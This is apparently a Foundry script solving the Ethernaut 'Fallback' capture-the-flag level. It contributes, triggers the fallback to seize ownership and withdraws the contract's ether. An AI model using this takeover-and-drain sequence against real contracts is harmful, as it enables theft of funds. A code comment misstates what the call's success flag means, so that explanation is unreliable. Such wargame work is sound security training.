// SPDX-License-Identifier: MIT



pragma solidity ^0.8.21;

import {Fallback} from "../src/Fallback.sol";
import {Script, console} from "forge-std/Script.sol";

contract FallbackHack is Script {
    Fallback public fallbackWTF =  // here we define the state variable fallbackWTF, which is an instance of the Fallback contract we triggered in https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639. //
        Fallback(payable(0xCFB3445a1F78B085ee9b395A4cFD3ae359a1C530));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY")); 

        // FIRST STEP: //
        fallbackWTF.contribute{value: 1 wei}();
        
        // SECOND STEP: //
        address(fallbackWTF).call{value: 1 wei}("");  
        // This is better practice to use .call, because it will not show the error fails or passes:
        /*  (bool success, ) = address(fallbackWTF).call{value: 1 wei}("");
        require(success, "Failed to send ether"); */
        // this way we can check the return value of the call. If it is false, we know the fallback function was triggered. If it is true, we know the fallback function was not triggered.
        console.log("New Address: ", fallbackWTF.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        
        // THIRD STEP: //
        fallbackWTF.withdraw();

        vm.stopBroadcast();
    }
}
